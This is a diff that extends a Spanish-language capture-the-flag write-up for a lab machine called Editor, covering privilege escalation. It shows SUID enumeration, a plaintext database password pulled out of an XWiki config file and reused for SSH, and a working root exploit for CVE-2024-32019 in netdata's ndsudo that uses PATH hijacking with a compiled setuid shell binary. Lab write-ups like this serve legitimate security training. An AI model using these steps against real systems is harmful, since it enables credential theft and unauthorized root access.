@@ -256,5 +256,95 @@ if __name__ == "__main__":
 ```
 ## Escalada de privilegios
 ### Enumeración del sistema 
-#### 
-Vemos que hemos ganado acceso al sistema como el usuario **xwiki**
+
+Vemos que hemos ganado acceso al sistema como el usuario **xwiki**, no tenemos permisos elevados, no podemos ejecutar comandos como sudo.
+
+Si vamos a /home vemos que hay un usuario llamado **oliver**.
+
+Vamos a buscar archivos con permisos mal configurados.
+
+```bash
+xwiki@editor:/usr/lib/xwiki-jetty$ find / -perm -4000 2>/dev/null
+
+/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
+/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
+/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
+/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+/opt/netdata/usr/libexec/netdata/plugins.d/ioping
+/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
+/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/fusermount3
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chfn
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+ ```
+Nada interesante.
+
+En la documentación de xwiki, podemos ver que el archivo ```/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml``` guarda credenciales para comunicarse con la base de datos.
+
+```bash
+xwiki@editor:/usr/lib/xwiki-jetty$ cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml | grep password
+
+    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
+    <property name="hibernate.connection.password">xwiki</property>
+    <property name="hibernate.connection.password">xwiki</property>
+    <property name="hibernate.connection.password"></property>
+    <property name="hibernate.connection.password">xwiki</property>
+    <property name="hibernate.connection.password">xwiki</property>
+    <property name="hibernate.connection.password"></property>
+
+```
+Con la primera contraseña nos podemos conectar por **SSH** con el usuario **oliver**.
+
+![](imgs-editor/ssh.png)
+
+#### Flag de Usuario
+```bash
+oliver@editor:~$ ls
+file.txt  linenum.sh  mal.c  nvme  user.txt
+``` 
+
+### Root
+
+#### PoC CVE-2024-32019
+
+{{< github repo="AzureADTrent/CVE-2024-32019-POC"showThumbnail=true >}}
+
+Hay que compilarlo localmente y compartirlo a la maquina víctima porque no tiene gcc.
+
+```bash
+❯ cat poc.c                                                
+#include <unistd.h>
+
+int main() {
+    setuid(0); setgid(0);
+    execl("/bin/bash", "bash", NULL);
+    return 0;
+}
+
+❯ gcc poc.c -o nvme
+
+❯ scp nvme oliver@editor.htb:/tmp/                         
+
+```
+**Ejecución de la vulnerabilidad**
+```bash
+
+oliver@editor:~$ chmod +x /tmp/nvme
+oliver@editor:~$ export PATH=/tmp:$PATH
+oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+root@editor:/home/oliver# id
+uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
+root@editor:/home/oliver# cat /root/root.txt
+
+```
+
